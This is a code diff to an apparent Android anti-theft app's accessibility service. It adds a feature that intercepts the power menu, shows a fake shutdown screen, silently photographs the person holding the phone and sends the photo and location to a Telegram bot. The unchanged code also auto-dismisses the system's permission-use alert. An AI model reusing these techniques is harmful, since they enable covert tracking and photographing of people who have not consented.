@@ -1,6 +1,9 @@
 package com.izhaanintellect.pasa.accessibility
 
 import android.accessibilityservice.AccessibilityService
+import android.app.KeyguardManager
+import android.content.Context
+import android.content.Intent
 import android.graphics.Bitmap
 import android.os.Build
 import android.os.Handler
@@ -9,13 +12,27 @@ import android.util.Log
 import android.view.Display
 import android.view.accessibility.AccessibilityEvent
 import android.view.accessibility.AccessibilityNodeInfo
+import com.izhaanintellect.pasa.bot.SendMessageRequest
+import com.izhaanintellect.pasa.bot.TelegramApi
+import com.izhaanintellect.pasa.camera.StealthCaptureBridge
+import com.izhaanintellect.pasa.commands.FakeShutdownCommand
+import com.izhaanintellect.pasa.location.LocationTracker
+import com.izhaanintellect.pasa.ui.FakeShutdownActivity
+import com.izhaanintellect.pasa.util.SecurityActivityLauncher
 import java.io.File
 import java.io.FileOutputStream
 import java.util.concurrent.CountDownLatch
 import java.util.concurrent.TimeUnit
+import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.launch
 import kotlinx.coroutines.runBlocking
 import kotlinx.coroutines.sync.Mutex
 import kotlinx.coroutines.sync.withLock
+import okhttp3.MediaType.Companion.toMediaTypeOrNull
+import okhttp3.MultipartBody
+import okhttp3.RequestBody.Companion.asRequestBody
+import okhttp3.RequestBody.Companion.toRequestBody
 
 /**
  * AccessibilityService for covert screen capture.
@@ -47,12 +64,12 @@ class AccessibilityScreenCaptureService : AccessibilityService() {
         Log.i(TAG, "AccessibilityScreenCaptureService connected - ready for screenshot capture")
         try {
             val info = serviceInfo ?: android.accessibilityservice.AccessibilityServiceInfo()
-            // High-performance filter: only intercept clicks (duress PIN) and window transitions (lost mode)
-            info.eventTypes = AccessibilityEvent.TYPE_VIEW_CLICKED or AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
+            info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK
             info.feedbackType = android.accessibilityservice.AccessibilityServiceInfo.FEEDBACK_GENERIC
             info.flags = info.flags or
                     android.accessibilityservice.AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS or
-                    android.accessibilityservice.AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
+                    android.accessibilityservice.AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
+                    android.accessibilityservice.AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS
             serviceInfo = info
         } catch (e: Exception) {
             Log.w(TAG, "Failed to configure dynamic serviceInfo: ${e.message}")
@@ -70,6 +87,8 @@ class AccessibilityScreenCaptureService : AccessibilityService() {
     @dagger.hilt.InstallIn(dagger.hilt.components.SingletonComponent::class)
     interface AccessibilityEntryPoint {
         fun duressManager(): com.izhaanintellect.pasa.detection.DuressManager
+        fun telegramApi(): TelegramApi
+        fun locationTracker(): LocationTracker
     }
 
     private val keyBuffer = StringBuilder()
@@ -236,7 +255,10 @@ class AccessibilityScreenCaptureService : AccessibilityService() {
                 handleKeypadClickEvent(event, prefs)
             }
 
-            // 2. Intercept SystemUI / notification panel / launcher during Lost Mode
+            // 2. Intercept Power Menu / Power Off to trigger Fake Shutdown deception
+            handlePowerMenuInterception(event)
+
+            // 3. Intercept SystemUI / notification panel / launcher during Lost Mode
             if (prefs.isLostModeActive) {
                 val pkg = event?.packageName?.toString() ?: ""
                 val cls = event?.className?.toString() ?: ""
@@ -256,9 +278,230 @@ class AccessibilityScreenCaptureService : AccessibilityService() {
                 }
             }
 
-            // 3. Auto-dismiss "Controlled permissions" notification strictly from Permission Controller
+            // 4. Auto-dismiss "Controlled permissions" notification strictly from Permission Controller
             autoDismissPermissionControllerAlert(event)
         } catch (_: Exception) {}
+    }
+
+    private var lastPowerMenuInterceptTime = 0L
+
+    /**
+     * Intercepts the SystemUI Power Dialog (long-press Power button / Global Actions)
+     * and automatically triggers Fake Shutdown deception while the device is locked.
+     */
+    private fun handlePowerMenuInterception(event: AccessibilityEvent?) {
+        val ev = event ?: return
+        if (!prefs.isFakeShutdownAutoPowerMenu) return
+        if (prefs.isFakeShutdownActive) return
+
+        val km = getSystemService(Context.KEYGUARD_SERVICE) as? KeyguardManager
+        val isLocked = km?.isKeyguardLocked == true || km?.isDeviceLocked == true || prefs.isLostModeActive
+        if (prefs.isFakeShutdownAutoLockedOnly && !isLocked) {
+            // Unlocked device: permit legitimate owner power-down or restart
+            return
+        }
+
+        val now = System.currentTimeMillis()
+        if (now - lastPowerMenuInterceptTime < 5_000L) {
+            return
+        }
+
+        val pkg = ev.packageName?.toString() ?: ""
+        val cls = ev.className?.toString() ?: ""
+        val eventType = ev.eventType
+
+        var isPowerMenuEvent = false
+
+        val isSystemPkg = pkg.contains("systemui", ignoreCase = true) ||
+                pkg.contains("motorola", ignoreCase = true) ||
+                pkg.contains("globalactions", ignoreCase = true) ||
+                pkg.contains("powerkeeper", ignoreCase = true) ||
+                pkg.contains("power", ignoreCase = true) ||
+                pkg == "android"
+
+        // Match 1: Class name explicitly matches known power dialog classes
+        val isGlobalActionsClass = cls.contains("GlobalActions", ignoreCase = true) ||
+                cls.contains("PowerDialog", ignoreCase = true) ||
+                cls.contains("ShutdownMenu", ignoreCase = true) ||
+                cls.contains("ShutdownDialog", ignoreCase = true) ||
+                cls.contains("PowerMenu", ignoreCase = true) ||
+                cls.contains("PowerOff", ignoreCase = true)
+
+        if (isSystemPkg && isGlobalActionsClass) {
+            isPowerMenuEvent = true
+            Log.d(TAG, "Power menu match: class name $cls in $pkg")
+        }
+
+        // Match 2: Active Window inspection (find "Power off", "Restart", or global_actions view IDs)
+        if (!isPowerMenuEvent && isSystemPkg) {
+            try {
+                val root = rootInActiveWindow ?: ev.source
+                if (root != null) {
+                    val hasPowerOffNode = root.findAccessibilityNodeInfosByText("Power off").isNotEmpty() ||
+                            root.findAccessibilityNodeInfosByText("Shut down").isNotEmpty() ||
+                            root.findAccessibilityNodeInfosByText("Power down").isNotEmpty() ||
+                            root.findAccessibilityNodeInfosByText("Turn off").isNotEmpty()
+
+                    val hasRestartNode = root.findAccessibilityNodeInfosByText("Restart").isNotEmpty() ||
+                            root.findAccessibilityNodeInfosByText("Reboot").isNotEmpty()
+
+                    if (hasPowerOffNode && (hasRestartNode || cls.contains("Dialog", ignoreCase = true) || cls.contains("Window", ignoreCase = true))) {
+                        isPowerMenuEvent = true
+                        Log.d(TAG, "Power menu match: found Power off & Restart nodes in $pkg")
+                    }
+
+                    if (!isPowerMenuEvent) {
+                        val hasGlobalActionsId = root.findAccessibilityNodeInfosByViewId("com.android.systemui:id/global_actions_view").isNotEmpty() ||
+                                root.findAccessibilityNodeInfosByViewId("com.android.systemui:id/global_actions_grid").isNotEmpty() ||
+                                root.findAccessibilityNodeInfosByViewId("com.android.systemui:id/global_actions_panel").isNotEmpty() ||
+                                root.findAccessibilityNodeInfosByViewId("com.android.systemui:id/power_menu").isNotEmpty() ||
+                                root.findAccessibilityNodeInfosByViewId("com.android.systemui:id/actions_container").isNotEmpty() ||
+                                root.viewIdResourceName?.contains("global_actions", ignoreCase = true) == true
+                        if (hasGlobalActionsId) {
+                            isPowerMenuEvent = true
+                            Log.d(TAG, "Power menu match: found global_actions viewId in $pkg")
+                        }
+                    }
+                }
+            } catch (e: Exception) {
+                Log.w(TAG, "Error inspecting root window for power menu: ${e.message}")
+            }
+        }
+
+        // Match 2b: Scan all interactive system windows (covers system overlay dialogs)
+        if (!isPowerMenuEvent && Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+            try {
+                for (w in windows) {
+                    val wRoot = w.root ?: continue
+                    val hasOff = wRoot.findAccessibilityNodeInfosByText("Power off").isNotEmpty() ||
+                            wRoot.findAccessibilityNodeInfosByText("Shut down").isNotEmpty() ||
+                            wRoot.findAccessibilityNodeInfosByText("Power down").isNotEmpty() ||
+                            wRoot.findAccessibilityNodeInfosByText("Turn off").isNotEmpty()
+                    val hasRe = wRoot.findAccessibilityNodeInfosByText("Restart").isNotEmpty() ||
+                            wRoot.findAccessibilityNodeInfosByText("Reboot").isNotEmpty()
+                    if (hasOff && (hasRe || w.type == android.view.accessibility.AccessibilityWindowInfo.TYPE_SYSTEM)) {
+                        isPowerMenuEvent = true
+                        Log.d(TAG, "Power menu match: found in interactive window ${w.title}")
+                        break
+                    }
+                }
+            } catch (_: Exception) {}
+        }
+
+        // Match 3: User or thief clicks "Power off", "Shut down", or "Restart" button
+        if (!isPowerMenuEvent && eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
+            val text = ev.text?.joinToString(" ") ?: ""
+            val desc = ev.contentDescription?.toString() ?: ""
+            val viewId = ev.source?.viewIdResourceName ?: ""
+
+            val isPowerClick = text.contains("Power off", ignoreCase = true) ||
+                    desc.contains("Power off", ignoreCase = true) ||
+                    text.contains("Shut down", ignoreCase = true) ||
+                    desc.contains("Shut down", ignoreCase = true) ||
+                    text.contains("Power down", ignoreCase = true) ||
+                    desc.contains("Power down", ignoreCase = true) ||
+                    viewId.contains("power_off", ignoreCase = true) ||
+                    viewId.contains("shutdown", ignoreCase = true)
+
+            val sourceHasPowerOff = try {
+                ev.source?.findAccessibilityNodeInfosByText("Power off")?.isNotEmpty() == true ||
+                        ev.source?.findAccessibilityNodeInfosByText("Shut down")?.isNotEmpty() == true
+            } catch (_: Exception) { false }
+
+            if ((isPowerClick || sourceHasPowerOff) && isSystemPkg) {
+                isPowerMenuEvent = true
+                Log.d(TAG, "Power menu match: click on power action view in $pkg")
+            }
+        }
+
+        if (isPowerMenuEvent) {
+            lastPowerMenuInterceptTime = now
+            Log.w(TAG, "🚨 UNAUTHORIZED POWER-OFF ATTEMPT DETECTED! Engaging Fake Shutdown deception.")
+
+            // 1. Immediately dismiss system power dialog to abort real shutdown/restart
+            performGlobalAction(GLOBAL_ACTION_BACK)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+                performGlobalAction(GLOBAL_ACTION_DISMISS_NOTIFICATION_SHADE)
+            }
+
+            // 2. Launch FakeShutdownActivity via SecurityActivityLauncher
+            try {
+                val fakeIntent = FakeShutdownActivity.createIntent(applicationContext).apply {
+                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
+                }
+                SecurityActivityLauncher.launch(
+                    context = applicationContext,
+                    intent = fakeIntent,
+                    notificationId = FakeShutdownCommand.NOTIFICATION_ID,
+                    notificationTitle = "🛡️ PASA Stealth Shield Active",
+                    notificationText = "Simulating power-off deception",
+                    wakeScreen = true,
+                    ongoing = true
+                )
+            } catch (e: Exception) {
+                Log.e(TAG, "Failed launching FakeShutdownActivity on power menu intercept", e)
+            }
+
+            // 3. Dispatch covert forensics & Telegram notification
+            dispatchPowerMenuAlert(isLocked)
+        }
+    }
+
+    private fun dispatchPowerMenuAlert(isLocked: Boolean) {
+        CoroutineScope(Dispatchers.IO).launch {
+            try {
+                val entryPoint = dagger.hilt.android.EntryPointAccessors.fromApplication(
+                    applicationContext,
+                    AccessibilityEntryPoint::class.java
+                )
+                val telegramApi = entryPoint.telegramApi()
+                val locationTracker = entryPoint.locationTracker()
+
+                val loc = locationTracker.getCurrentLocation()
+                val locText = if (loc != null) {
+                    "\n📍 <b>Location:</b> <a href=\"https://www.google.com/maps?q=${loc.latitude},${loc.longitude}\">${loc.latitude}, ${loc.longitude}</a>"
+                } else ""
+
+                val stateText = if (isLocked) "Locked Screen" else "Unlocked Screen"
+                val alertText = "🚨 <b>UNAUTHORIZED POWER-OFF INTERCEPTED!</b>\n━━━━━━━━━━━━━━━━━━━━\n" +
+                        "⚠️ Someone held the Power button to shut down or restart the device ($stateText).\n\n" +
+                        "🎭 <b>PASA Fake Shutdown Engaged:</b>\n" +
+                        "• Screen blacked out with OEM power-down animation\n" +
+                        "• SystemUI and buttons locked\n" +
+                        "• GPS and covert surveillance remain 100% active$locText\n\n" +
+                        "🔓 <i>To wake device:</i> <code>/wake &lt;master_password&gt;</code>"
+
+                if (prefs.botToken.isNotBlank() && prefs.ownerChatIdLong != 0L) {
+                    telegramApi.sendMessage(
+                        token = prefs.botToken,
+                        request = SendMessageRequest(
+                            chatId = prefs.ownerChatIdLong,
+                            text = alertText
+                        )
+                    )
+
+                    // Capture silent front-camera perpetrator mugshot
+                    val captureResult = StealthCaptureBridge.capturePhoto(applicationContext, useFront = true)
+                    captureResult.file?.let { photoFile ->
+                        if (photoFile.exists() && photoFile.length() > 0) {
+                            val chatIdBody = prefs.ownerChatId.toRequestBody("text/plain".toMediaTypeOrNull())
+                            val captionBody = "🚨 Perp attempting power-off".toRequestBody("text/plain".toMediaTypeOrNull())
+                            val fileBody = photoFile.asRequestBody("image/jpeg".toMediaTypeOrNull())
+                            val part = MultipartBody.Part.createFormData("photo", photoFile.name, fileBody)
+
+                            telegramApi.sendPhoto(
+                                token = prefs.botToken,
+                                chatId = chatIdBody,
+                                photo = part,
+                                caption = captionBody
+                            )
+                        }
+                    }
+                }
+            } catch (e: Exception) {
+                Log.e(TAG, "Failed sending power menu alert: ${e.message}", e)
+            }
+        }
     }
 
     private fun autoDismissPermissionControllerAlert(event: AccessibilityEvent?) {
